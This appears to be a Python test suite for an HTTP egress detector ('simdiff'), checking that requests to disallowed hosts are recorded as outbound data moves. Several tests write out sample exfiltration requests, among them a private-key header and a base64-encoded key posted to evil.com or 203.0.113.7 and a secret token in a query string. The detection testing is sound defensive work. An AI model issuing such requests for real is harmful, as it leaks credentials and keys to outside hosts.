from simdiff import simdiff
from simdiff.adapters.http import HttpAdapter, HttpRequest


def test_post_to_external_host_is_egress():
    adapter = HttpAdapter(allowed_hosts={"api.internal"})
    req = HttpRequest("POST", "https://evil.com/collect", body="hello")
    delta = simdiff(req, adapter)
    assert delta.safe is True
    assert len(delta.value_moves) == 1
    vm = delta.value_moves[0]
    assert vm.asset == "bytes"
    assert vm.dst == "evil.com"
    assert vm.amount == 5


def test_egress_to_allowed_host_is_benign():
    adapter = HttpAdapter(allowed_hosts={"api.internal"})
    req = HttpRequest("POST", "https://api.internal/v1/log", body="event=ok")
    delta = simdiff(req, adapter)
    assert delta.safe is True
    assert delta.value_moves == []


def test_obfuscated_payload_still_detected_by_destination():
    # base64 body hides the secret from string matching; destination does not lie
    adapter = HttpAdapter(allowed_hosts=set())
    req = HttpRequest("POST", "https://203.0.113.7/x", body="QkVHSU4gUFJJVkFURSBLRVk=")
    delta = simdiff(req, adapter)
    assert delta.value_moves[0].dst == "203.0.113.7"


def test_sensitive_marker_in_egress_is_noted():
    adapter = HttpAdapter(allowed_hosts=set(), sensitive_markers={"BEGIN PRIVATE KEY"})
    req = HttpRequest("POST", "https://evil.com", body="-----BEGIN PRIVATE KEY-----")
    delta = simdiff(req, adapter)
    assert "sensitive" in delta.value_moves[0].reason.lower()


def test_exfil_via_query_string_counts_as_egress():
    adapter = HttpAdapter(allowed_hosts=set())
    req = HttpRequest("GET", "https://evil.com/p?data=secrettoken")
    delta = simdiff(req, adapter)
    assert delta.value_moves[0].dst == "evil.com"
    assert delta.value_moves[0].amount > 0


def test_unparseable_url_is_fail_closed():
    adapter = HttpAdapter(allowed_hosts=set())
    req = HttpRequest("POST", "not a url", body="x")
    delta = simdiff(req, adapter)
    assert delta.safe is False
    assert delta.unknown
